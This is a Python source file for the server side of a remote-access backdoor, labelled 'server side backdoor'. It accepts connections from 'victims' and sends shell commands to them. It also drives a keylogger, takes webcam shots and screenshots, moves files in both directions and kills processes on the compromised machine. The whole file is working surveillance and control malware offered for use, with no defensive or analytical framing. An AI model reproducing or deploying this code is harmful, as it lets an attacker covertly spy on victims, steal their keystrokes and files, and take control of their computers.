# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: zNairy#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, gaierror
from threading import Thread
from getpass import getuser
from pickle import loads, dumps
from pathlib import Path
from time import sleep, time
from rich.progress import BarColumn, Progress, TimeRemainingColumn
from rich import print as printr
from rich.console import Console
from rich.table import Table
from rich.box import SIMPLE
from os import system, uname

class Server(object):
    """ server side backdoor """
    def __init__(self, host='0.0.0.0', port=5000):
        self.__Address = (host, port)
        self.connectedUsers = {}
        self.userAttached = self.userCwd = ''
        self.especialCommands = {'clear': self.clearScreen, 'cls': self.clearScreen, 'exit': self.closeTerminal}

    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    # kills some processes by name or pid
    def terminateProcess(self, processname):
        if processname and self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                printr(header['content'])
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr('Info: Kills some process running by name or PID. | Ex: [green]/terminateprocess windowsexplorer.exe [yellow]or[green] /terminateprocess 3123')

    # getting info of only one process
    def getProcessInfo(self, processname):
        if processname and self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                if header['sucess']:
                    processInfo = self.receiveProcessList(connection, header)
                    table = Table(show_footer=False, title=f'List of all {processname.title()} processes running', box=SIMPLE) # creating table to show data from received processes
                    for column in ['PID', 'User', 'Process Name', 'Executable', 'Cwd', 'Cpu', 'Mem']: # adding the columns
                        table.add_column(column, justify='center')

                    for process in processInfo: # adding the rows
                        table.add_row(str(process['pid']), process['username'], process['name'], process['exe'], process['cwd'], f"{process['cpu_percent']}%", f"{process['memory_percent']:.2f}%")

                    console = Console() # creating the Console object
                    console.print(table, f':white_check_mark: {processname.title()} {header["total"]} processes running', justify="center") # printing the table
                else:
                    printr(header['content'])
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr('Info: Shows basic information of only one process running on the client side. | Ex: [green]/processinfo windowsexplorer.exe [yellow]or[green] /processinfo 3123')

    # getting all processes running in client side
    def getProcessList(self, args):
        if self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                processInfo = self.receiveProcessList(connection, header)
                table = Table(show_footer=False, title=f"List of all processes running.", box=SIMPLE) # creating table to show data from received processes
                for column in ['PID', 'User', 'Process Name', 'Executable', 'Cwd']: # adding the columns
                    table.add_column(column, justify="center")

                for process in processInfo: # adding the rows
                    table.add_row(str(process['pid']), process['username'], process['name'], process['exe'], process['cwd'])
                
                console = Console() # creating the Cosole object
                console.print(table, f"{header['total']} processes running", justify="center") # printing the table
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr(f'Info: Shows basic information of all process running on the client side')

    def receiveProcessList(self, connection, header):
        progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())

        with progress:
            task = progress.add_task(f"Receiving process list", total=header['bytes'])

            processList = received = b''

            while len(processList) < header['bytes']:
                received = connection.recv(header['bytes'])
                processList += received
                progress.update(task, advance=len(received))
        
        return loads(processList)

    # starting the keyboard logger
    def kloggerStart(self, args):
        if self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                printr(header['content'])
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr(f'Info: Starts a keyboard listener on the client side.')
    
    # saving the captured keys 
    def kloggerDump(self, args):
        if self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                if header['sucess']:
                    self.receiveFile(connection, header)
                    printr(f'[green] See in [yellow]/files/{header["namefile"]}{header["extension"]}')
                else:
                    printr(header['content'])
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr(f'Info: Saves the keys captured so far.')

    # stopping the keyboard logger
    def kloggerStop(self, args):
        if self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                printr(header['content'])                    
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr(f'Info: Stop the keyboard listener and save the captured keys.')

    # getting the current user who you are attached
    def getCurrentUser(self):
        return self.connectedUsers[self.userAttached]

    # basic information of session you are
    def sessionInfo(self, args):
        if self.userAttached:
            userInfo = self.getCurrentUser()
            hour, minute, second = self.calculateElapsedTime(time()-userInfo["initialTime"]) # elapsed session time
            data = [
                f'Name Session: [green]{self.userAttached}',
                f'[white]Current Directory: [green]"{userInfo["currentDirectory"]}"',
                f'[white]Elapsed session Time: [green]{hour}:{minute}:{int(second)} [white]seconds'
            ]

            for info in data:
                printr(info)
        else:
            printr(f'Info: Shows basic information of the session you are linked')

    # basic information from attached user
    def userInfo(self, args):
        if self.userAttached:
            user = self.getCurrentUser()
            for key, value in user.items():
                if key not in ['conn', 'currentDirectory', 'initialTime']:
                    printr(f'[white]{key}: [green]{value}')
        else:
            printr(f'Info: Shows basic information of the user you are linked')

    # attaches to an active session
    def attach(self, name):
        if name:
            if self.connectedUsers.get(name):
                self.userAttached = name
                self.userCwd = self.getCurrentUser()['currentDirectory']
                printr(f'[green] You are attached to a section with [yellow]{name}[green] now!')
            else:
                printr(f'[red] There is no open session with [yellow]{name}.')
        else:
            printr('Info: Attaches to an active session. [green]Ex: /attach zNairy-PC')

    # detach a active session
    def detach(self, name=''):
        if self.userAttached:
            self.userAttached = self.userCwd = ''
        else:
            printr(f'Info: Detach from the current session (when you are in one)')

    # checking if folders for screenshot or downloaded files exists
    def checkFolders(self):
        for folder in ['./screenshots','./files']:
            if not Path(folder).is_dir():
                Path(folder).mkdir()

    # send header to client side (about messages, files...)
    def sendHeader(self, connection, header):
        connection.send(dumps(header))

    def receiveHeader(self, connection):
        return loads(connection.recv(512))

    # return name of file, your extension and bytes content
    def splitFile(self, path):
        with open(path, 'rb') as file:
            return Path(path).stem, Path(path).suffix, file.read()

    # saving any received file from client side
    def saveReceivedFile(self, path, content):
        with open(path, 'wb') as receivedFile:
            receivedFile.write(content)

    # receiving bytes content of any file from client side | params: connection= current user attached, header= received header of file
    def receiveFile(self, connection, header):
        self.checkFolders()
        progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())

        with progress:
            task = progress.add_task(f"Downloading {header['namefile']}", total=header['bytes'])

            file = received = b''

            while len(file) < header['bytes']:
                received = connection.recv(header['bytes'])
                file += received
                progress.update(task, advance=len(received))

        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', file)
    
    # uploading a local file (server side) to client side
    def upload(self, args):
        if args and self.userAttached:
            try:
                if Path(args).is_file():
                    connection = self.getCurrentUser()['conn']
                    connection.send(self.lastCommand.encode())
                    
                    namefile, extension, file = self.splitFile(args)
                    self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
                    sleep(1)
                    connection.send(file)

                    response = self.receiveHeader(connection)
                    if response['sucess']:
                        printr(f"[green]{response['content']}")
                    else:
                        printr(f"[red]{response['content']}")
                else:
                    printr(f'[red] File {args} not found.')
            except PermissionError:
                printr(f'[red] Permission denied: {args}')
        else:
            printr('Info: Upload a file to client. [green]Ex: /upload nothing.pdf')

    # downloading a file from client side
    def download(self, args):
        if args and self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                if header["sucess"]:
                    self.receiveFile(connection, header)
                else:
                    printr(f'[red]{header["content"]}')
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')

    # taking a webcam shot from client side
    def webcamshot(self, args):
        self.checkFolders()

        if self.userAttached:
            try:
                connection = self.getCurrentUser()['conn']
                connection.send(self.lastCommand.encode())
                
                header = self.receiveHeader(connection)
                if args:
                    if header['sucess']:
                        self.receiveFile(connection, header)
                    else:
                        printr(header["content"])
                else:
                    if header['sucess']:
                        printr(header['content'])
                        printr(f'[green]Pass any webcam [yellow]Id[green] to take a webcamshot | Ex: [yellow]/webcamshot 2')
                    else:
                        printr(header["content"])
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr('Info: Takes a webcamshot of the user you are attached')

    # taking a screenshot from client side
    def screenshot(self, args):
        if self.userAttached:
            connection = self.getCurrentUser()['conn']
            connection.send(self.lastCommand.encode())
            try:
                header = self.receiveHeader(connection)
                self.receiveFile(connection, header)
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr('Info: Takes a screenshot of the user you are attached')

    # calculating time response of some command  | param: seconds of the period
    def calculateElapsedTime(self, seconds):
        seconds = seconds % (24 * 86400)
        day = seconds // 86400
        seconds = seconds - (day * 86400)
        hour = seconds // 3600
        seconds = seconds - (hour * 3600)
        minutes = seconds // 60
        seconds = seconds - (minutes * 60)

        return int(hour), int(minutes), seconds

    # adding the user to a session 
    def addUser(self, data):
        self.connectedUsers.update({data['name']: data})
    
    # removing the current session attached
    def removecurrentSession(self):
        self.connectedUsers.pop(self.userAttached)
        self.detach()

    # removing the user from a session 
    def removeUserSession(self, name):
        if name:
            if self.connectedUsers.get(name):
                if self.userAttached:
                    self.detach(self.userAttached)
                self.connectedUsers.pop(name)
                printr(f'[green] Session with [yellow]{name} [green]removed!')
            else:
                printr(f'[red] There is no open session with [yellow]{name}.')
        else:
            printr('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')
    
    # cleaning the screen (obviously) 
    def clearScreen(self, args=''):
        system('clear' if uname().sysname.lower() == 'linux' else 'cls')

    # showing the active sessions 
    def showSessions(self, args):
        if self.connectedUsers:
            print(''.join(f'  -{name}\n' for name in self.connectedUsers.keys()))
        else:
            printr('[yellow] There is no open sessions currently.')

    # showing the version of program
    def showVersion(self, args):
        printr(__version__)

    # showing how you can contact the author of code
    def showContact(self, args):
        printr(__contact__)

    # showing the author of code | "well, of couse i know him. He's me"
    def showCodeAuthor(self, args):
        printr(__author__)

    # closing the session/terminal session and exiting the program 
    def closeTerminal(self, args=''):
        exit()

    # showing the available commands to use
    def availableCommands(self, args):
        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))

    # showing only the internal commands
    def internalcommands(self, args):
        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))

    # return all defined commands of program | setting a new command, name, your action, features...
    def allCommands(self):
        commands = {
            "/attach": {"local": True, "action": self.attach},
            "/detach": {"local": True, "action": self.detach},
            "/sessions": {"local": True, "action": self.showSessions},
            "/sessioninfo": {"local": True, "action": self.sessionInfo},
            "/userinfo": {"local": True, "action": self.userInfo},
            "/rmsession": {"local": True, "action": self.removeUserSession},
            "/screenshot": {"local": False, "action": self.screenshot},
            "/webcamshot": {"local": False, "action": self.webcamshot},
            "/download": {"local": False, "action": self.download},
            "/upload": {"local": False, "action": self.upload},
            "/processlist": {"local": False, "action": self.getProcessList},
            "/processinfo": {"local": False, "action": self.getProcessInfo},
            "/terminateprocess": {"local": False, "action": self.terminateProcess},
            "/kloggerstart": {"local": False, "action": self.kloggerStart},
            "/kloggerdump": {"local": False, "action": self.kloggerDump},
            "/kloggerstop": {"local": False, "action": self.kloggerStop},
            "/author": {"local": True, "action": self.showCodeAuthor},
            "/contact": {"local": True, "action": self.showContact},
            "/version": {"local": True, "action": self.showVersion},
            "/internalcommands": {"local": True, "action": self.internalcommands}
        }

        commands.update({"/commands": {"local": True, "action": self.availableCommands}}) # adding /commands to show all commands available to use

        return commands

    # returns function of the command (your action) and your respective arguments, if exists, if not returns False.
    def splitCommand(self, command):
        if self.allCommands().get(command.split()[0]):
            # 0: function, 1: args | example: /attach znairy = self.attach, 'znairy'
            return self.allCommands()[command.split()[0]]["action"], ''.join(f'{cmd} ' for cmd in command.split()[1:])

        return False, '' # command does not exist

    # checking the possible commands (strings that starts with "/")
    def runCommand(self, command):
        self.lastCommand = command

        command, args = self.splitCommand(command)
        if command:
            command(args.strip()) # running the command passing your arguments #
        else:
            printr('[red] Command does not exist.')

    # receiving bytes from command response 
    def receiveCommand(self, connection, header):
        received = b''
        while len(received) < header['bytes']:
            received += connection.recv(header['bytes'])

        print(received.decode())

        h, m, s = self.calculateElapsedTime(time() - header["initialTime"]);del(h,m)
        printr(f'returned in {s:.1f} seconds.') # time response of command

    # send command to be execute in shell of client side
    def sendCommand(self, command):
        self.lastCommand = command

        if self.userAttached: # if exists session attached
            connection = self.getCurrentUser()['conn'] # getting the socket object from the current user
            connection.send(command.encode())
            try:
                header = self.receiveHeader(connection) # receiving header of the command
                self.userCwd = header['currentDirectory'] # updating the current directory you are
                self.receiveCommand(connection, header)
            except EOFError:
                printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                self.removecurrentSession() # removing the current session because connection probaly was lost
        else:
            printr('[yellow] No session currently attached.')

    # starting the 'terminal' to get commands
    def startTerminal(self):
        try:
            while True:
                # yourusername@sonaris: current directory you are
                printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]:{self.userCwd}# ', end='')
                command = input().strip()
                
                if command:
                    if command.split()[0] not in ['clear', 'cls', 'exit']: # 'especial' commands
                        if command.startswith('/'): # characteristic of an server command
                            self.runCommand(command)
                        else:
                            self.sendCommand(command) # send to client side
                    else:
                        self.especialCommands[command.split()[0]]()
        except KeyboardInterrupt:
            print()
            exit()

    # start a thread
    def startProcess(self, function, arg=()):
        thread = Thread(target=function)
        thread.daemon = True
        thread.start()

    # receive the connections from the 'victims' in a paralel process
    def listenConnections(self):
        while True:
            connection, address = self.__Server.accept();del(address)
            response = loads(connection.recv(1024))
            response.update({"conn": connection, "initialTime": time()})
            self.addUser(response)
            printr(f'\n[yellow][*] Incoming connection from [green]{response["name"]}:{response["SO"]}')
            printr(f'[green]{getuser()}'+ '[white]@' + f'[green]sonaris[white]#:{self.userCwd}# ', end='')

    # configuring the socket object
    def configureSocket(self):
        try:
            self.__Server = socket(AF_INET, SOCK_STREAM)
            self.__Server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.__Server.bind(self.__Address)
            self.__Server.listen(1)
        except OverflowError:
            printr(f' "{self.__Address[1]}" [red]Port too large, must be 0-65535');exit(1)
        except OSError:
            printr(f' "{self.__Address[0]}" Cannot assign requested address');exit(1)
        except gaierror:
            printr(f' "{self.__Address[0]}" [red]Name or service not known');exit(1)

    # showing the info/configuration of the server (your address and port)
    def info(self):
        return f' Server is open on {self.__Address[0]}:{self.__Address[1]}'

    # starting the program
    def run(self):
        self.configureSocket()
        
        printr(self.info())
        self.startProcess(self.listenConnections)
        self.startTerminal()
